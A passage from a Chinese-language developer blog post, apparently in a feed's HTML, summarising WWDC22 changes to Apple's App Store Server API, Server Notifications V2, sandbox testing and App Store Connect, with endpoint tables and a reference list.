打开外部链接帐户</span></span><br><span class="line">            <span class="keyword">try</span> <span class="keyword">await</span> <span class="type">ExternalLinkAccount</span>.open()</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(error.localizedDescription)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意事项：</p><ul><li>获取苹果许可权限后，您才可以在 app 中包含链接到外部网站进行帐户创建或管理</li><li>只有用户点击 <code>Continue</code>（继续）后，才能跳转到外部网站进行帐户创建或管理</li><li>跳转到外部网站，不能有没有任何重定向、中间链接或着陆页面</li><li>不得在 URL 中传递附加参数，以便保护用户 (例如用户的隐私)</li></ul><h3 id="App-Store-Server-API"><a href="#App-Store-Server-API" class="headerlink" title="App Store Server API"></a>App Store Server API</h3><p><code>App Store Server API</code> 是苹果去年 WWDC21 推出的 ，详细可以参考我们之前的文章《<a href="https://juejin.cn/post/7056976669139009573">WWDC21 - App Store Server API 实践总结</a>》。</p><p>今年 WWDC22 苹果新增了三个新接口，并且对部分接口增加了过滤功能，这里我们列了一个表格：</p><table><thead><tr><th>推出时间</th><th align="left">接口</th><th>说明</th><th>链接</th></tr></thead><tbody><tr><td>WWDC21</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/look_up_order_id">Look Up Order ID</a></td><td><strong>查询用户订单的收据</strong>，使用订单ID从收据中获取用户的应用内购买项目收据信息。</td><td><code>GET https://api.storekit.itunes.apple.com/inApps/v1/lookup/&#123;orderId&#125;</code></td></tr><tr><td>WWDC21</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">Get Transaction History</a></td><td><strong>查询用户历史收据</strong>，获取用户在您的 app 的应用内购买交易历史记录。</td><td><code>GET https://api.storekit.itunes.apple.com/inApps/v1/history/&#123;originalTransactionId&#125;</code></td></tr><tr><td>WWDC21</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/get_refund_history">Get Refund History</a></td><td><strong>查询用户内购退款</strong>，获取 app 中为用户退款的所有应用内购买项目的列表。</td><td><code>GET https://api.storekit.itunes.apple.com/inApps/v1/refund/lookup/&#123;originalTransactionId&#125;</code></td></tr><tr><td>WWDC21</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/get_all_subscription_statuses">Get All Subscription Statuses</a></td><td><strong>查询用户订阅项目状态</strong>，获取您 app 中用户所有订阅的状态。</td><td><code>GET https://api.storekit.itunes.apple.com/inApps/v1/subscriptions/&#123;originalTransactionId&#125;</code></td></tr><tr><td>WWDC21</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information">Send Consumption Information</a></td><td><strong>提交防欺诈信息</strong>，当用户申请退款时，苹果通知（CONSUMPTION_REQUEST）开发者服务器，开发者可在12小时内，提供用户的信息（比如游戏金币是否已消费、用户充值过多少钱、退款过多少钱等），最后苹果收到这些信息，协助“退款决策系统” 来决定是否允许用户退款。</td><td><code>PUT https://api.storekit.itunes.apple.com/inApps/v1/transactions/consumption/&#123;originalTransactionId&#125;</code></td></tr><tr><td>WWDC21</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/extend_a_subscription_renewal_date">Extend a Subscription Renewal Date</a></td><td><strong>延长用户订阅的时长</strong>，使用原始交易标识符延长用户有效订阅的续订日期。（相当于免费给用户增加订阅时长）</td><td><code>PUT https://api.storekit.itunes.apple.com/inApps/v1/subscriptions/extend/&#123;originalTransactionId&#125;</code></td></tr><tr><td>WWDC22</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/request_a_test_notification">Request a Test Notification</a></td><td><strong>测试 App Store 服务器通知</strong>，让 App Store 服务器通知向开发者服务器发送测试通知。</td><td><code>POST https://api.storekit.itunes.apple.com/inApps/v1/notifications/test</code></td></tr><tr><td>WWDC22</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/get_test_notification_status">Get Test Notification Status</a></td><td><strong>获取 App Store 服务器通知的测试结果</strong>，获取发送到开发者服务器的 App Store 服务器测试通知的检查状态。</td><td><code>GET https://api.storekit.itunes.apple.com/inApps/v1/notifications/test/&#123;testNotificationToken&#125;</code></td></tr><tr><td>WWDC22</td><td align="left"><a href="https://developer.apple.com/documentation/appstoreserverapi/get_notification_history">Get Notification History</a></td><td><strong>获取 App Store 服务器通知的历史通知</strong>，获取 App Store 服务器尝试发送到开发者服务器的通知列表。</td><td><code>POST https://api.storekit.itunes.apple.com/inApps/v1/notifications/history</code></td></tr></tbody></table><h4 id="Filter-and-Sort（过滤和排序）"><a href="#Filter-and-Sort（过滤和排序）" class="headerlink" title="Filter and Sort（过滤和排序）"></a>Filter and Sort（过滤和排序）</h4><p>其中只有 <a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">Get Transaction History</a> 接口提供了过滤和排序的功能：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-15.png" alt="WWDC22-IAP-15"></p><p>目前支持的查询参数列表：</p><table><thead><tr><th>查询参数</th><th>作用</th><th>可选值</th></tr></thead><tbody><tr><td>productType</td><td>包含在交易历史记录中的产品类型。您的查询可以指定多个productType。</td><td>AUTO_RENEWABLE, NON_RENEWABLE, CONSUMABLE, NON_CONSUMABLE</td></tr><tr><td>productId</td><td>包含在交易历史记录中的产品标识符。您的查询可以指定多个productID。</td><td>-</td></tr><tr><td>subscriptionGroupIdentifier</td><td>包含在交易历史记录中的订阅组标识符。您的查询可能会指定多个subscriptionGroupIdentifier。</td><td>-</td></tr><tr><td>startDate</td><td>交易开始日期，以 UNIX 时间表示的时间跨度的开始日期，以毫秒为单位。</td><td>-</td></tr><tr><td>endDate</td><td>交易截止日期，以 UNIX 时间表示的时间跨度的截止日期，以毫秒为单位。</td><td>-</td></tr><tr><td>inAppOwnershipType</td><td>按应用程序内所有权类型限制交易历史记录。</td><td>PURCHASED，FAMILY_SHARED。</td></tr><tr><td>excludeRevoked</td><td>交易历史记录是否排除退款和撤销的交易。默认值为false。</td><td>true, false</td></tr><tr><td>sort</td><td>交易历史记录的可选排序顺序。响应按最近修改的日期对交易记录进行排序。默认值为 ASCENDING（升序），因此您首先会收到最旧的交易记录。</td><td>ASCENDING, DESCENDING</td></tr><tr><td>revision</td><td>获取下一组最多20笔交易的令牌。所有回复都包含一个revision令牌。注意：对于使用revision令牌的请求，请包含与初始请求相同的查询参数。使用上一个History中的revision令牌。除初始请求外，所有请求都需要revision。</td><td>-</td></tr></tbody></table><p>查询示例：<br><img src="https://ihtcboy.com/images/WWDC22-IAP-16.png" alt="WWDC22-IAP-16"></p><p><code>productId</code>、<code>productType</code> 和 <code>subscriptionGroupIdentifier</code> 查询参数可以同时指定多个值。例如，要按 NON_CONSUMABLE（非消耗型） 和 AUTO_RENEWABLE（自动续期产品类型）字符来筛选交易历史记录，请求中包含以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https://api.storekit.itunes.apple.com/inApps/v1/history/&#123;originalTransactionId&#125;?productType=NON_CONSUMABLE&amp;productType=AUTO_RENEWABLE</span><br></pre></td></tr></table></figure><p>其实更优雅的方式可能是 App Store Connect API 的形式：<code>&amp;filter[appStoreVersions.appStoreState]=READY_FOR_SALE,PREORDER_READY_FOR_SALE,READY_FOR_REVIEW</code> 。</p><p>最后，交易历史记录接口返回结果只支持以下情况：</p><ul><li>自动续期订阅</li><li>非续订订阅</li><li>非消耗型应用内购买项目</li><li>消耗型应用内购买项目：如果交易被退款、撤销或 app 尚未完成交易处理等。</li></ul><blockquote><p>特别注意：消耗型应用内购买项目如果调用了 <a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">finishTransaction(_:)</a>，则不会在出现在舞台的交易历史列表中，所以，<strong>消耗型应用内购买项目不能使用这个接口作为校验接口！！！</strong></p></blockquote><h4 id="New-Notification-API（新的通知接口）"><a href="#New-Notification-API（新的通知接口）" class="headerlink" title="New Notification API（新的通知接口）"></a>New Notification API（新的通知接口）</h4><p><strong>测试 App Store 服务器通知</strong></p><p><a href="https://developer.apple.com/documentation/appstoreserverapi/request_a_test_notification">Request a Test Notification</a> 让 App Store 服务器通知向开发者服务器发送测试通知。 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/notifications/</span>test</span><br></pre></td></tr></table></figure><p><img src="https://ihtcboy.com/images/WWDC22-IAP-17.png" alt="WWDC22-IAP-17"></p><p>接口响应的 <code>testNotificationToken</code> 字段是 App Store 服务器通知发送到开发者服务器的通知测试的测试通知令牌，每次请求获取的唯一标识 Token，这个 Token 用于下面的接口参数。</p><p><strong>获取 App Store 服务器通知的测试结果</strong></p><p><a href="https://developer.apple.com/documentation/appstoreserverapi/get_test_notification_status">Get Test Notification Status</a>，获取发送到开发者服务器的 App Store 服务器测试通知的检查状态。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/notifications/</span>test/&#123;testNotificationToken&#125;</span><br></pre></td></tr></table></figure><p>根据 <a href="https://developer.apple.com/documentation/appstoreserverapi/request_a_test_notification">Request a Test Notification</a> 接口获取到的 <code>testNotificationToken</code> 请求测试结果：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-18.png" alt="WWDC22-IAP-18"></p><p>返回的响应有两个参数:</p><ul><li><code>firstSendAttemptResult</code>：表示 App Store 服务器尝试向开发者服务器发送 TEST 通知的结果，如果不是 <code>SUCCESS</code>，则如上图会返回原因，如果 <code>TIMED_OUT</code> 表示超时，<code>SSL_ISSUE</code> 表示开发者服务器的 SSL 证书有问题。根据这个字段就能测试和检查 App Store 服务器和开发者服务器之前的连通性。</li><li><code>signedPayload</code>：JWS 格式的签名有效负载，包含 App Store 服务器发送到您的服务器的 TEST 通知。</li></ul><p>具体的 <code>signedPayload</code> 解码后的格式内容如下示例：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-19.png" alt="WWDC22-IAP-19"></p><p> <strong>获取 App Store 服务器通知的历史通知</strong></p><p> <a href="https://developer.apple.com/documentation/appstoreserverapi/get_notification_history">Get Notification History</a>，获取 App Store 服务器尝试发送到开发者服务器的通知列表。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/notifications/</span>history</span><br></pre></td></tr></table></figure><p>此接口的目的是，因为 App Store 服务器通知是苹果推送的通知，开发者是被动接收，总会因为各种情况（服务器宕机，运营商链路或云服务提供商故障等）导致无法按时接收到 App Store 服务器通知。所以，可以通过这个接口查询 App Store 服务器通知的历史记录：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-20.png" alt="WWDC22-IAP-20"></p><ul><li>只支持 App Store 服务器通知 V2 版本的响应（即 JWS 格式）</li><li>最多可以查询 6 个月以内的历史列表（180天内）</li><li>可以过滤通知类型、通知子类型或用户</li><li>开发者服务器宕机后可使用接口主动获取通知记录，直到开发者服务器可接收 App Store 服务器通知为止</li></ul><p>查询接口的示例：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-21.png" alt="WWDC22-IAP-21"></p><p>接口每次最多返回20条通知历史记录，所以响应会返回一个 <code>paginationToken</code> 字段，用来查询更多分页的通知结果。paginationToken 获取下一组最多 20 条通知历史记录，所有有更多历史记录的响应都包含 paginationToken 字段。</p><h4 id="New-properties（新特性）-1"><a href="#New-properties（新特性）-1" class="headerlink" title="New properties（新特性）"></a>New properties（新特性）</h4><p>除了 StoreKit 2 增加了 <code>environment</code>、<code>recentSubscriptionStartDate</code> 字段，App Store Server API 的 JWS 格式的签名交易也包含。</p><p>JWS transaction info Decoded Payload:</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-22.png" alt="WWDC22-IAP-22"></p><p>JWS renewal info Decoded Payload:</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-23.png" alt="WWDC22-IAP-23"></p><p>详细说明可以查看官方文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/environment">environment</a> 和 <a href="https://developer.apple.com/documentation/appstoreserverapi/recentsubscriptionstartdate">recentSubscriptionStartDate</a>，这里不在复述。</p><h3 id="App-Store-Server-Notifications-V2"><a href="#App-Store-Server-Notifications-V2" class="headerlink" title="App Store Server Notifications V2"></a>App Store Server Notifications V2</h3><p>同理 App Store Server Notifications 也有新增相应的 <a href="https://developer.apple.com/documentation/appstoreservernotifications/environment">environment</a> 和 <a href="https://developer.apple.com/documentation/appstoreservernotifications/recentsubscriptionstartdate">recentSubscriptionStartDate</a> 字段。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-24.png" alt="WWDC22-IAP-24"></p><p>从这个图片可以看出，App Store Server API 是 App Store 服务器和开发者服务器之前，相互可以响应的流程。而 App Store Server Notifications V1 和 V2 通知，是 App Store 服务器主动通知开发者服务器，开发者服务器不能主动请求，所以导致了一些场景的缺陷。</p><h4 id="App-Store-服务器通知宕机"><a href="#App-Store-服务器通知宕机" class="headerlink" title="App Store 服务器通知宕机"></a>App Store 服务器通知宕机</h4><p>服务器宕机是很常见的问题，但是宕机后，开发者就无法接收 App Store 服务器的通知。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-25.png" alt="WWDC22-IAP-25"></p><p>所以，<a href="https://developer.apple.com/documentation/appstoreservernotifications/responding_to_app_store_server_notifications">App Store Server Notifications V2</a> 通知在首次尝试通知后没有收到来自开发者服务器的响应时会进行重试：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-26.png" alt="WWDC22-IAP-26"></p><ul><li>App Store Server Notifications V1：重试三次；在上次尝试后 6、24 和 48 小时。</li><li>App Store Server Notifications V2：重试五次；在上次尝试后 1、12、24、48 和 72 小时。</li></ul><p>重试成功后，开发者服务器接收到的通知，可以并不再是顺序显示：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-27.png" alt="WWDC22-IAP-27"></p><p>所以，开发者需要通过 <code>signedDate</code> 字段，确保通知的顺序逻辑正确，也就是说通知的结果状态以最新的 signedDate 时间来准，来更新用户能享受的服务。而重试的通知可能会出现重复的通知响应，所以开发者可以通过 <code>notificationUUID</code> 字段去重通知。</p><h4 id="留住订阅者"><a href="#留住订阅者" class="headerlink" title="留住订阅者"></a>留住订阅者</h4><p>用户需要不断从订阅中获得价值，才会持续地订阅您的 App。定期更新您的 App，提供新内容和增强功能，以鼓励订阅者继续订阅。</p><p>App Store Server Notifications V2 提供了更多的通知类型，达到 28 个，未来还会增加更多。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-28.png" alt="WWDC22-IAP-28"></p><p>这里一个用户订阅过程的可能会发生的通知：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-29.png" alt="WWDC22-IAP-29"></p><p>从这个图中，开发者可以思考到什么？</p><p><strong>Subscription loyalty（订阅忠诚度）</strong></p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-30.png" alt="WWDC22-IAP-30"></p><p>从苹果的 <a href="https://developer.apple.com/cn/app-store/subscriptions/#retaining-subscribers">自动续期订阅</a> 文档可以获取这样的思考：</p><p>通过使用 <a href="https://developer.apple.com/cn/app-store/subscriptions/#retaining-subscribers">获取所有订阅状态</a> 接口和 <a href="https://developer.apple.com/cn/app-store/subscriptions/#retaining-subscribers">获取交易历史记录</a> 接口，可确定用户的订阅状态并查看交易历史记录，帮助您识别并执行以下操作：</p><ul><li><strong>自愿流失</strong>。使用 <a href="https://developer.apple.com/cn/app-store/subscriptions/#retaining-subscribers">获取所有订阅状态</a> 接口确定订阅者是不是已关闭特定订阅的自动续订。您还可以使用 App Store 服务器通知来获取有关用户状态变化的实时更新以及与其 App 内购买项目相关的关键事件，例如退款通知。使用这一信息来采取相应的行动，例如，您可以提供促销优惠以鼓励他们继续订阅，建议更符合他们需求的备用等级，或者在订阅到期后锁定相关订阅内容的访问权限。请务必向用户告知您所做的任何更改，以及他们是否需要完成任何操作，还有重新订阅的方式。</li><li><strong>非自愿流失</strong>。当订阅者遇到账单问题 (如信用卡过期问题) 时，就会发生非自愿流失。选择接收服务器通知以了解何时由于账单问题而导致订阅续订失败，或使用 <a href="https://developer.apple.com/cn/app-store/subscriptions/#retaining-subscribers">获取所有订阅状态</a> 接口确定订阅是不是由于账单问题而处于计费重试状态。根据上述信息采取相应措施，例如，您可以在 App 中显示信息或发送电子邮件，提醒订阅者更新他们之前登记的付款方式，并提供其 App Store 帐户中“付款信息”区域的链接。一旦问题得到解决，您就可以恢复服务。Apple 将在 60 天内尝试收取付款。如果订阅在 60 天内续订，则付费服务的天数从续订日期开始继续累积。</li></ul><p>为避免由于账单问题而导致服务中断，请在 App Store Connect 中启用账单宽限期。Apple 将尝试解决账单问题，并在订阅者保留订阅访问权限的同时恢复订阅。如果订阅在这个期限内恢复，则付费服务天数的计数和您的收入都不会中断。如果用户在 60 天后重新订阅，则付费服务的天数将重置，您将收到一年的标准订阅费用，直到付费服务满一年为止。</p><ul><li><strong>价格上调同意状态</strong>。当您提高订阅价格时，Apple 会询问受影响的订阅者是否同意这个新价格，您可以在价格变动生效之前跟踪用户的同意状态。在向受影响的用户显示价格上调单之前，您可以显示一条 App 内信息，说明订阅的好处和价值，以及价格上调将如何改善服务。如果用户没有对上调做出反应，他们的订阅将在当前结算周期结束时到期。</li></ul><p>简单来说，通过订阅通知，分析用户的忠诚度，根据用户不同的行为习惯和选择决定（通知），然后分析用户行为的背后原因，从而优化开发者的服务，从而提升订阅的忠诚度！</p><h3 id="App-Store-Connect"><a href="#App-Store-Connect" class="headerlink" title="App Store Connect"></a>App Store Connect</h3><p>App Store 相关的调整不多，都是细节优化。</p><h4 id="Sandbox-amp-Test"><a href="#Sandbox-amp-Test" class="headerlink" title="Sandbox &amp; Test"></a>Sandbox &amp; Test</h4><p>开发人员将能够更轻松地创建沙盒用户，并测试沙盒购买。相比以前少了 <code>安全提示问题</code>、<code>安全提示问题答案</code>、<code>出生日期</code> 三个选项。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-31.png" alt="WWDC22-IAP-31"></p><p>增加了 <code>Allow Purchase &amp; Renewals</code> 开关，用于测试订阅到期自动扣费和失败重试。<br><img src="https://ihtcboy.com/images/WWDC22-IAP-32.png" alt="WWDC22-IAP-32"></p><p>Xcode StoreKit 测试中添加了更多测试用例，例如退款请求、优惠代码兑换、订阅涨价、账单扣款重试等。这是一个不错的改进，但目前测试内购功能的开发者还不多，详细参考 <a href="https://developer.apple.com/videos/play/wwdc2022/10039/">What’s new in StoreKit testing - WWDC22</a>。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-33.png" alt="WWDC22-IAP-33"></p><h4 id="App-Store-Connect-API"><a href="#App-Store-Connect-API" class="headerlink" title="App Store Connect API"></a>App Store Connect API</h4><p>App Store Connect API 增加了查询沙盒账号、清除沙盒内购历史记录、设置中断内购状态等，也增加内购、用户商店评论内容和回复、App 挂起诊断数据等接口。</p><p>最重要是，增加了内购项目的创建！</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-34.png" alt="WWDC22-IAP-34"></p><p>内购品项和订阅品项的相关 API：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-35.png" alt="WWDC22-IAP-35"></p><ul><li>新建订阅品项</li><li>创建、编辑和删除品项</li><li>管理定价</li><li>提交审核</li><li>创建优惠和促销代码</li></ul><p>目前截止本文发表，苹果 <a href="https://developer.apple.com/documentation/appstoreconnectapi">App Store Connect API</a> 文档，依然还没有看到这些接口的描述！</p><p>最后，是苹果弃用 XML 流文档的形式与 App Store Connect 的交互，未来开发者，都需要迁移到 App Store Connect API！<br><img src="https://ihtcboy.com/images/WWDC22-IAP-36.png" alt="WWDC22-IAP-36"></p><p>这个怎么理解？参考我们之前开源的一款苹果 macOS 工具：《<a href="https://juejin.cn/post/7081069026515877919">AppleParty（苹果派）</a>》，它使用到了苹果 <a href="https://help.apple.com/itc/transporteruserguide/#/itc0d5b535bf">Transporter</a> 命令工具，批量上传内购商品列表和上传 IAP 包文件等。预测 <a href="https://help.apple.com/itc/appsreporterguide/#/itcbe21ac7db">Reporter</a> 和 <a href="https://help.apple.com/asc/appsaltool/#/">altool</a> 等命令也会被弃用。</p><p>苹果表示，今年秋天开始停用 XML 提交，强制推荐使用 App Store Connect API  接口。但目前还没有看到官网相关的说明文档！</p><h4 id="App-Store"><a href="#App-Store" class="headerlink" title="App Store"></a>App Store</h4><p>今年 <a href="https://developer.apple.com/app-store/whats-new/">App Store</a> 相关更新，可能最引人关注的功能，就是这个 <code>Benchmarks in App Analytics</code>（App 分析中的基准）功能，，基准通过将与获客率、使用和盈利情况相关的绩效指标置于具体情境中，在整个客户旅程期间提供有价值的见解，这样您就可以很容易地看到您与同行相比的表现，并做出相应决策以实现业务目标。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-37.png" alt="WWDC22-IAP-37"></p><p>查看自己 app 与同行相比的表现，并做出实现业务目标的决策。使用差异隐私技术，以确保机密信息的安全和私密性。苹果表示这个功能明年 2023 年初才上线，目前官方文档也没有找到详细的介绍。差异隐私技术介绍可以参考我们之前的文章《<a href="https://juejin.cn/post/7116331493659508744">WWDC22 - Apple 隐私技术探索</a>》。</p><p>关于 app 数据，Xcode 提供了功率、性能指标和诊断等新接口。</p><ul><li>分析和解决 App 挂起（hangs：延时、慢、卡顿）</li><li>查看诊断签名</li><li>下载详细日志</li></ul><p><img src="https://ihtcboy.com/images/WWDC22-IAP-38.png" alt="WWDC22-IAP-38"></p><p>详细功能可以参考：<a href="https://developer.apple.com/videos/play/wwdc2020/10057">Identify trends with the Power and Performance API - WWDC20</a> 和 <a href="https://developer.apple.com/videos/play/wwdc2022/10082">Track down hangs with Xcode and on-device detection - WWDC22</a>。</p><p>在 <a href="https://apps.apple.com/cn/app/app-store-connect/id1234793120">App Store Connect app</a> 中可以送审内购、新版本、In-App Event、产品面优化、自定义产品而等。</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-39.png" alt="WWDC22-IAP-39"></p><p>目前苹果支持送审的内容：</p><p><img src="https://ihtcboy.com/images/WWDC22-IAP-40.png" alt="WWDC22-IAP-40"></p><p>可以看到 iOS 除了新版本 app 送审，现在支持 In-App Event、自定义产品、产品面优化测试等。而 tvOS 和 macOS 目前还没有，可能明年 WWDC23 应该就支持一波了吧！</p><p>另外，需要提示一下，送审新版本 app 、In-App Event、自定义产品、产品面优化测试等，苹果是建议开发者可以合并提交一起送审，因为这样苹果会以当前送审的内容一起审核，提高苹果的审核效率？总之，提审这些项目后，如果有项目审核不通过，可以单独发布审核通过的内容。<br><img src="https://ihtcboy.com/images/WWDC22-IAP-41.png" alt="WWDC22-IAP-41"></p><p>关于 App Store 的优化，2022 年 1 月 20 日 <a href="https://developer.apple.com/cn/news/?id=9sjl5wuv">推出适用于订阅的自定优惠代码</a>，开发者可以自定义，如 <code>VIP888</code> 的优惠代码，用于推广活动，自定代码可通过直接 URL 或在您的 app 中兑换。2022 年 4 月 29 日 <a href="https://developer.apple.com/cn/news/?id=gi6npkmf">阐明 App Store 改善流程的标准和新的限期延长</a>，苹果明确了 App 长期不更新被下架的细则，当一款 App 在过去三年内从未更新且未达到最低下载量 (即该 App 在连续 12 个月内完全没有或只有极低的下载量) 时，其开发者将会收到电子邮件，告知该 App 已被识别并可能从 App Store 中被移除，开发者收到通知起，有 90 天的时间来更新他们的 App。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关于 In App Purchase 和 App Store，随着这几年苹果的开放，已经很大程度上解决了开发者大多数的问题，从退款查询到所有订单查询，从被动通知到主动获取通知，从内购税率降低到提高 App 曝光量，苹果已经提供了非常多的接口、案例展示和建议。比如，自动续期订阅类型，目前已经复杂到不能再复杂，订阅群组、免费试用期限、推介促销优惠、促销优惠、优惠代码、计费重试、重新激活、续期等。</p><p>最后，大家觉得 <code>In App Purchase</code> 和 <code>App Store</code> 还有什么疑惑或痛点吗？</p><p>欢迎大家评论区一起讨论交流~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h3><ul><li><a href="https://juejin.cn/post/6974733392260644895">苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21 - 掘金</a></li><li><a href="https://developer.apple.com/cn/news/?id=i7jzeefs">App Store Small Business Program 公布 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/news/?id=6lyxewwp">注册新的 App Store Small Business Program - Apple Developer</a></li><li><a href="https://www.apple.com.cn/newsroom/2020/11/developers-see-a-world-of-possibilities-with-new-app-store-small-business-program/">全新的 App Store 小型企业计划让开发者看到无尽可能 - Apple (中国大陆)</a></li><li><a href="https://developer.apple.com/cn/app-store/small-business-program/">App Store Small Business Program - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/news/?id=kw16tplo">要求在线团体活动需使用 App 内购买方式的截止日期已延长 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/news/?id=6qfoid1d">针对在线团体活动服务的 app 内购买项目规定更新 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/news/?id=yeyd5xuh">针对在线多人活动的 app 内购买项目规定提醒 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/review/guidelines/#in-app-purchase">App Store 审核指南 - Apple Developer</a></li><li><a href="https://www.apple.com.cn/newsroom/2021/08/apple-us-developers-agree-to-app-store-updates/">Apple 与美国开发者就 App Store 更新达成一致 - Apple (中国大陆)</a></li><li><a href="https://developer.apple.com/cn/news/?id=r24k5i3m">小型业务开发者协助申请提交将于 5 月 20 日截止 - Apple Developer</a></li><li><a href="https://smallappdeveloperassistance.com/">Cameron et al. v. Apple Inc.</a></li><li><a href="https://www.apple.com.cn/newsroom/2021/09/japan-fair-trade-commission-closes-app-store-investigation/">日本公平贸易委员会结束对 App Store 的调查 - Apple (中国大陆)</a></li><li><a href="https://developer.apple.com/cn/news/?id=grjqafts">“阅读器”app 分发的更新 - Apple Developer</a></li><li><a href="https://developer.apple.com/news/?id=mbbs4zql">Update on dating apps distributed on the App Store in the Netherlands - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/support/storekit-external-entitlement/">Distributing dating apps in the Netherlands - Apple Developer</a></li><li><a href="https://developer.apple.com/news/?id=uub8j2f1">Additional details available for dating apps in the Netherlands - Apple Developer</a></li><li><a href="https://developer.apple.com/news/?id=jmps5hyj">Update on StoreKit External Entitlement for dating apps - Apple Developer</a></li><li><a href="https://developer.apple.com/news/?id=3bttqj0z">Further updates on StoreKit External Entitlement for dating apps in the Netherlands storefront - Latest News - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/news/?id=tpgp89cl">订阅通知更新 - 最新动态 - Apple Developer</a></li><li><a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/devc9870599e">管理自动续期订阅的定价 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/cn/news/?id=q0feipe4">针对在韩国分发 App 的更新 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/support/storekit-external-entitlement-kr/">Distributing apps using a third-party payment provider in South Korea - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/storekit/apptransaction">AppTransaction | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/message">Message | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/skmutablepayment/1506088-applicationusername">applicationUsername | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/transaction/3749684-appaccounttoken">appAccountToken | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/external_purchase">External Purchase | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/external_link_account">External Link Account | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi">App Store Server API | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreservernotifications">App Store Server Notifications | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi">App Store Connect API | Apple Developer Documentation</a></li><li><a href="https://juejin.cn/post/7056976669139009573">WWDC21 - App Store Server API 实践总结 - 掘金</a></li><li><a href="https://juejin.cn/post/7081069026515877919">开源一款苹果 macOS 工具 - AppleParty（苹果派） - 掘金</a></li><li><a href="https://juejin.cn/post/7116331493659508744">WWDC22 - Apple 隐私技术探索 - 掘金</a></li><li><a href="https://help.apple.com/itc/transporteruserguide/#/itc0d5b535bf">Transporter 用户指南</a></li><li><a href="https://help.apple.com/asc/appsaltool/#/">altool 指南</a></li><li><a href="https://help.apple.com/itc/appsreporterguide/#/itcbe21ac7db">Reporter 用户指南</a></li><li><a href="https://developer.apple.com/cn/app-store/">充分利用 App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/subscriptions/">自动续期订阅 - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/news/?id=gi6npkmf">阐明 App Store 改善流程的标准和新的限期延长 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/news/?id=9sjl5wuv">现已推出适用于订阅的自定优惠代码 - Apple Developer</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
